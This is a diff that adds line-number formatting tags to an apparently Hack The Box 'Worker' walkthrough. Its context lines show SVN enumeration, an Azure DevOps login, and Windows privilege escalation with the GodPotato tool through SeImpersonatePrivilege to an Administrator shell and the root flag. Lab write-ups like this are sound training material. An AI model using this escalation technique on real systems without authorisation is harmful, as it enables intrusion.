@@ -17,6 +17,7 @@ PORT     STATE SERVICE  VERSION
 |_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -144,6 +145,7 @@ D    moved.txt
 A    deploy.ps1
 Updated to revision 2.
 ```
+{: .nolineno}
 
 I set the `/etc/hosts` file as `dimension.worker.htb` and I got this site → 
 
@@ -168,6 +170,7 @@ You can find the latest version at: http://devops.worker.htb
 
 // The Worker team :) 
 ```
+{: .nolineno}
 
 So I set the new subdomain name in hosts file and used that credentials to login and I got Azure DevOps dashboard.
 
@@ -239,6 +242,7 @@ hostname
 Worker
 PS C:\ProgramData>
 ```
+{: .nolineno}
 
 I checked the privileges and I got `SeImpersonatePrivilege` Enabled so lets Impersonate this user to Administrator and I also checked `systeminfo` and this system is **Microsoft Windows Server 2019 Standard** so I could use `GodPotato` lets try it here →
 
@@ -303,6 +307,7 @@ System Type:               x64-based PC
 ...
 ...
 ```
+{: .nolineno}
 
 Now lets use this , first lets try simple ‘*whoami*’ command →
 
@@ -336,6 +341,7 @@ PS C:\ProgramData> .\GodPotato-NET4.exe -cmd "cmd /c whoami"
 [*] process start with pid 7652
 PS C:\ProgramData>
 ```
+{: .nolineno}
 
 Now lets have a Administrative shell → 
 
@@ -375,5 +381,6 @@ type Desktop\root.txt
 cd6662b58f099f18977c1c29a399bc8f
 PS C:\Users\Administrator>
 ```
+{: .nolineno}
 
 I am Administrator Now !!
